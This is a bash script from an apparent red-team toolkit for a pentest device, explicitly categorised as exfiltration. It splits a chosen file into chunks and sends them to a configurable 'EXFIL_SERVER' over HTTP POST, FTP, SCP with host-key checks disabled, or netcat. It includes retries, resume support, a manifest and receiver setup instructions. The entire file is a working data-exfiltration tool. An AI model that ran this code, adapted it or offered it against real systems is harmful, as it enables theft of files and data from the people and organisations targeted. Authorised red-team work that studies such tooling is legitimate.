#!/bin/bash
# Title: Staged File Transfer
# Description: Chunked file transfer with resume capability and multiple protocols
# Author: Red Team Toolkit
# Version: 1.0
# Category: exfiltration
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Amber: Preparing chunks
# - Cyan blink: Transferring
# - Yellow: Retrying
# - Green: Complete
# - Red: Error
#
# Use Case: Transfer large files reliably over unstable connections
# Supports: HTTP POST, FTP, SCP, NC (netcat)

set -euo pipefail

# Configuration - REPLACE WITH YOUR INFRASTRUCTURE
EXFIL_SERVER="${EXFIL_SERVER:-example.com}"
EXFIL_PORT="${EXFIL_PORT:-8080}"
EXFIL_USER="${EXFIL_USER:-user}"
EXFIL_PASS="${EXFIL_PASS:-pass}"
CHUNK_SIZE="${CHUNK_SIZE:-65536}"  # 64KB chunks
MAX_RETRIES="${MAX_RETRIES:-3}"
RETRY_DELAY="${RETRY_DELAY:-5}"
ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/staged-transfer}"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  LED OFF
  rm -f "$ARTIFACTS_DIR"/*.chunk 2>/dev/null || true
}
trap cleanup EXIT

# Calculate file checksum
checksum() {
  local file="$1"
  if have md5sum; then
    md5sum "$file" | awk '{print $1}'
  elif have md5; then
    md5 -q "$file"
  else
    echo "unknown"
  fi
}

# Split file into chunks
split_file() {
  local file="$1"
  local chunk_dir="$2"
  
  mkdir -p "$chunk_dir"
  
  local file_size
  file_size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
  
  local num_chunks=$(( (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE ))
  
  LOG "Splitting into $num_chunks chunks..."
  
  split -b "$CHUNK_SIZE" -d "$file" "$chunk_dir/chunk_"
  
  # Generate manifest
  local manifest="$chunk_dir/manifest.txt"
  {
    echo "FILE=$(basename "$file")"
    echo "SIZE=$file_size"
    echo "CHECKSUM=$(checksum "$file")"
    echo "CHUNKS=$num_chunks"
    echo "CHUNK_SIZE=$CHUNK_SIZE"
    echo "TIMESTAMP=$(date +%s)"
    echo "---"
  } > "$manifest"
  
  # Add chunk checksums
  for chunk in "$chunk_dir"/chunk_*; do
    [[ -f "$chunk" ]] || continue
    echo "$(basename "$chunk"):$(checksum "$chunk")" >> "$manifest"
  done
  
  echo "$num_chunks"
}

# HTTP POST transfer
transfer_http() {
  local chunk="$1"
  local chunk_name="$2"
  local session_id="$3"
  
  local url="http://${EXFIL_SERVER}:${EXFIL_PORT}/upload"
  
  if have curl; then
    curl -s -X POST \
      -F "file=@${chunk}" \
      -F "name=${chunk_name}" \
      -F "session=${session_id}" \
      "$url" >/dev/null 2>&1
    return $?
  elif have wget; then
    wget -q --post-file="$chunk" -O /dev/null "$url?name=$chunk_name&session=$session_id" 2>/dev/null
    return $?
  fi
  return 1
}

# FTP transfer
transfer_ftp() {
  local chunk="$1"
  local chunk_name="$2"
  local session_id="$3"
  
  if have curl; then
    curl -s -T "$chunk" "ftp://${EXFIL_USER}:${EXFIL_PASS}@${EXFIL_SERVER}/${session_id}/${chunk_name}" >/dev/null 2>&1
    return $?
  elif have ftp; then
    ftp -n "$EXFIL_SERVER" <<EOF
user $EXFIL_USER $EXFIL_PASS
mkdir $session_id
cd $session_id
put $chunk $chunk_name
bye
EOF
    return $?
  fi
  return 1
}

# SCP transfer
transfer_scp() {
  local chunk="$1"
  local chunk_name="$2"
  local session_id="$3"
  
  if have scp; then
    scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      "$chunk" "${EXFIL_USER}@${EXFIL_SERVER}:${session_id}/${chunk_name}" 2>/dev/null
    return $?
  fi
  return 1
}

# Netcat transfer
transfer_nc() {
  local chunk="$1"
  local chunk_name="$2"
  local session_id="$3"
  
  if have nc; then
    # Send header + data
    {
      echo "CHUNK:${session_id}:${chunk_name}"
      cat "$chunk"
      echo ""
      echo "END_CHUNK"
    } | nc -w 5 "$EXFIL_SERVER" "$EXFIL_PORT" >/dev/null 2>&1
    return $?
  fi
  return 1
}

# Transfer with retries
transfer_chunk() {
  local chunk="$1"
  local chunk_name="$2"
  local session_id="$3"
  local method="$4"
  
  local attempt=0
  while (( attempt < MAX_RETRIES )); do
    case "$method" in
      http) transfer_http "$chunk" "$chunk_name" "$session_id" && return 0 ;;
      ftp)  transfer_ftp "$chunk" "$chunk_name" "$session_id" && return 0 ;;
      scp)  transfer_scp "$chunk" "$chunk_name" "$session_id" && return 0 ;;
      nc)   transfer_nc "$chunk" "$chunk_name" "$session_id" && return 0 ;;
    esac
    
    attempt=$((attempt + 1))
    if (( attempt < MAX_RETRIES )); then
      LED Y DOUBLE
      LOG "Retry $attempt/$MAX_RETRIES for $chunk_name..."
      sleep "$RETRY_DELAY"
    fi
  done
  
  return 1
}

# Resume support - check which chunks are done
get_resume_point() {
  local progress_file="$1"
  
  if [[ -f "$progress_file" ]]; then
    cat "$progress_file"
  else
    echo "0"
  fi
}

save_progress() {
  local progress_file="$1"
  local chunk_num="$2"
  
  echo "$chunk_num" > "$progress_file"
}

show_receiver_info() {
  LOG ""
  LOG blue "=== Receiver Setup ==="
  LOG ""
  LOG "HTTP: python3 -m http.server $EXFIL_PORT (with upload handler)"
  LOG "FTP: vsftpd or similar FTP server"
  LOG "NC: nc -l -p $EXFIL_PORT > received_data"
  LOG ""
}

main() {
  LOG blue "=== Staged File Transfer ==="
  LOG "Reliable chunked exfiltration"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  
  LED B SLOW
  
  # Select file
  local file
  file=$(TEXT_PICKER "File to transfer" "/tmp/data.tar.gz") || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  
  if [[ ! -f "$file" ]]; then
    ERROR_DIALOG "File not found: $file"
    exit 1
  fi
  
  local file_size
  file_size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
  local filename
  filename=$(basename "$file")
  
  LOG "File: $filename"
  LOG "Size: $file_size bytes"
  LOG ""
  
  # Select transfer method
  LOG "Transfer methods:"
  LOG "1. HTTP POST"
  LOG "2. FTP"
  LOG "3. SCP"
  LOG "4. Netcat (raw TCP)"
  LOG ""
  
  local method_num
  method_num=$(NUMBER_PICKER "Method (1-4)" 1) || true
  
  local method
  case "$method_num" in
    1) method="http" ;;
    2) method="ftp" ;;
    3) method="scp" ;;
    4) method="nc" ;;
    *) method="http" ;;
  esac
  
  LOG "Method: $method"
  
  # Configure server
  local server
  server=$(TEXT_PICKER "Server" "$EXFIL_SERVER") || true
  [[ -n "$server" ]] && EXFIL_SERVER="$server"
  
  local port
  port=$(NUMBER_PICKER "Port" "$EXFIL_PORT") || true
  [[ -n "$port" ]] && EXFIL_PORT="$port"
  
  if [[ "$method" == "ftp" || "$method" == "scp" ]]; then
    local user
    user=$(TEXT_PICKER "Username" "$EXFIL_USER") || true
    [[ -n "$user" ]] && EXFIL_USER="$user"
    
    local pass
    pass=$(TEXT_PICKER "Password" "$EXFIL_PASS") || true
    [[ -n "$pass" ]] && EXFIL_PASS="$pass"
  fi
  
  # Generate session ID
  local session_id
  session_id="session_$(date +%Y%m%d_%H%M%S)_$$"
  
  LOG ""
  LOG "Session: $session_id"
  LOG "Server: $EXFIL_SERVER:$EXFIL_PORT"
  LOG ""
  
  LED Y SOLID
  LOG "Preparing chunks..."
  
  # Split file
  local chunk_dir="$ARTIFACTS_DIR/$session_id"
  local num_chunks
  num_chunks=$(split_file "$file" "$chunk_dir")
  
  # Check for resume
  local progress_file="$chunk_dir/progress.txt"
  local start_chunk
  start_chunk=$(get_resume_point "$progress_file")
  
  if (( start_chunk > 0 )); then
    LOG "Resuming from chunk $start_chunk"
  fi
  
  LED C SLOW
  LOG "Transferring $num_chunks chunks..."
  
  # Send manifest first
  if ! transfer_chunk "$chunk_dir/manifest.txt" "manifest.txt" "$session_id" "$method"; then
    LOG red "Failed to send manifest"
  fi
  
  # Send chunks
  local success=0
  local failed=0
  
  for chunk in "$chunk_dir"/chunk_*; do
    [[ -f "$chunk" ]] || continue
    
    local chunk_name
    chunk_name=$(basename "$chunk")
    local chunk_num
    chunk_num=${chunk_name#chunk_}
    chunk_num=$((10#$chunk_num))  # Convert to decimal
    
    # Skip already transferred chunks
    if (( chunk_num < start_chunk )); then
      continue
    fi
    
    if transfer_chunk "$chunk" "$chunk_name" "$session_id" "$method"; then
      success=$((success + 1))
      save_progress "$progress_file" "$((chunk_num + 1))"
      
      local pct=$((success * 100 / num_chunks))
      LOG "[$pct%] Sent: $chunk_name"
    else
      failed=$((failed + 1))
      LED R DOUBLE
      LOG red "Failed: $chunk_name"
    fi
  done
  
  LED G SOLID
  
  LOG ""
  LOG green "=== Transfer Complete ==="
  LOG "Sent: $success/$num_chunks chunks"
  [[ $failed -gt 0 ]] && LOG red "Failed: $failed chunks"
  LOG "Session: $session_id"
  
  # Log transfer
  {
    echo "=== Staged Transfer Log ==="
    echo "Time: $(date)"
    echo "File: $file"
    echo "Size: $file_size"
    echo "Method: $method"
    echo "Server: $EXFIL_SERVER:$EXFIL_PORT"
    echo "Session: $session_id"
    echo "Chunks: $num_chunks"
    echo "Success: $success"
    echo "Failed: $failed"
  } >> "$ARTIFACTS_DIR/transfer_log.txt"
  
  VIBRATE
  show_receiver_info
  
  PROMPT "Press button to exit"
}

main "$@"
